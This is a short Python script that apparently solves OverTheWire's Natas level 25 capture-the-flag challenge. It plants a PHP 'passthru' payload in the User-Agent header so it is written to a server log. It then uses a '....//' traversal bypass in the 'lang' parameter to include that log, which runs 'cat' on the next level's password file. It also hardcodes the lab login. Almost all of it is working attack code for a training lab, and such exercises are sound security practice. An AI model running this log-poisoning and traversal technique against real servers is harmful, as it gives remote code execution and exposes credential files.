import requests
import re
base_url = 'http://natas25.natas.labs.overthewire.org'
AUTH = ('natas25', 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx')

session = requests.session()
session.auth = AUTH

r = session.get(base_url)   # get the initial phpsesid
session.headers =  {'User-Agent': '<?php passthru("cat /etc/natas_webpass/natas26"); ?>'}     # modify header to print passwords in logs

logs_url = base_url + f'?lang=....//logs/natas25_{session.cookies.get("PHPSESSID")}.log'    # use ....// instead of ../
r2 = session.get(logs_url)    # read the logs

print(r2.text)
print('password', [result.strip() for result in re.findall(r'.*\](.*)', r2.text)])
